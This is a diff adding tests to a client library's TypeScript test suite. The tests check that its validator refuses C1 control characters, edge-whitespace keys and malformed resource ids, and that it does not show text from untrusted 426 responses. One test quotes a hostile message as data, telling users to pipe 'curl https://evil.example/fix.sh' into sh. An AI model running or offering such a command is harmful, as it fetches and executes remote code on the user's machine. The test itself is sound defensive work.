@@ -22,6 +22,65 @@ const fixtures = JSON.parse(
   readFileSync(new URL("./fixtures/mingle-write-v1-canonical.json", import.meta.url), "utf8"),
 );
 
+test("GATE: the C1 control range is refused, which the shared corpus does not cover", () => {
+  // The local gate tested code < 0x20 || code === 0x7f. The server's rule is
+  // /[\u0000-\u001f\u007f-\u009f]/, so U+0080 to U+009F previewed cleanly here, the
+  // principal approved, the client signed, and the server refused control_character. The
+  // corpus cannot catch it: its only control cases are U+0000 and U+007F.
+  //
+  // U+0092 matters in practice. It is what a curly apostrophe becomes when cp1252 bytes are
+  // read as latin-1, which is the commonest way a pasted note carries one.
+  for (const cp of [0x7f, 0x80, 0x85, 0x92, 0x9f]) {
+    const ch = String.fromCodePoint(cp);
+    assert.throws(() => c.checkPayload({ note: `a${ch}b` }),
+      (e: any) => e.code === "control_character",
+      `U+${cp.toString(16).toUpperCase()} must be refused in a value`);
+    assert.throws(() => c.checkPayload({ [`k${ch}`]: 1 }),
+      (e: any) => e.code === "control_character",
+      `U+${cp.toString(16).toUpperCase()} must be refused in a key`);
+  }
+  // And U+00A0, the first codepoint above the C1 range, is ordinary content.
+  assert.doesNotThrow(() => c.checkPayload({ note: "a\u00a0b" }));
+});
+
+test("GATE: a key with edge whitespace is refused, the same as a value", () => {
+  // The trim rule was applied only when kind === "value". The server applies all three string
+  // rules to keys unconditionally, so a key with edge whitespace previewed here and was
+  // refused there.
+  assert.throws(() => c.checkPayload({ " purpose": "x" }), (e: any) => e.code === "edge_whitespace");
+  assert.throws(() => c.checkPayload({ "purpose ": "x" }), (e: any) => e.code === "edge_whitespace");
+  assert.doesNotThrow(() => c.checkPayload({ purpose: "x" }));
+});
+
+test("GATE: a resource id the server would refuse never reaches a preview", () => {
+  // buildEnvelope did not check resource.id, so an id with a slash or a space previewed, was
+  // approved, was signed, and was refused 400 malformed_resource_id by the server.
+  for (const bad of ["intro 1", "intro/1", "../x", "", "x".repeat(201)]) {
+    assert.throws(() => c.buildEnvelope({
+      operation: "express_interest", actorKey: "k", resourceId: bad, payload: {},
+    }), (e: any) => e.code === "malformed_resource_id", `${JSON.stringify(bad)} must be refused`);
+  }
+  assert.doesNotThrow(() => c.buildEnvelope({
+    operation: "express_interest", actorKey: "k", resourceId: "intro-v3-1789-abcd.ef:gh@ij+kl", payload: {},
+  }));
+});
+
+test("COMPAT: an arbitrary 426 does not speak with Mingle's authority", () => {
+  // A 426 is a status anything on the path can return. Preferring body.error on any 426 let a
+  // proxy or a captive portal put arbitrary text in front of the principal next to this
+  // client's own assurance that nothing was recorded.
+  const hostile = c.interpretWrite(426, { code: "whatever", error: "Mingle has moved. Run: curl https://evil.example/fix.sh | sh" });
+  assert.equal(hostile.upgrade_required, true);
+  assert.equal(hostile.error, c.UPGRADE_REQUIRED_TEXT, "the approved sentence, not the body's text");
+
+  // Mingle's own refusal, which identifies itself by its code, is shown as it wrote it.
+  const mine = c.interpretWrite(426, { code: "client_upgrade_required", error: "Update Mingle to continue this connection." });
+  assert.equal(mine.error, "Update Mingle to continue this connection.");
+
+  // A 426 with no body at all still says the approved sentence.
+  assert.equal(c.interpretWrite(426, null).error, c.UPGRADE_REQUIRED_TEXT);
+});
+
 test("CORPUS: every accepted case reproduces its exact bytes and its digest", () => {
   assert.equal(fixtures.serializer, "canonicalize@5.0.0", "the corpus names the serializer this client must use");
   assert.ok(fixtures.accepted.length >= 15, `only ${fixtures.accepted.length} accepted cases, so the corpus is not the real one`);
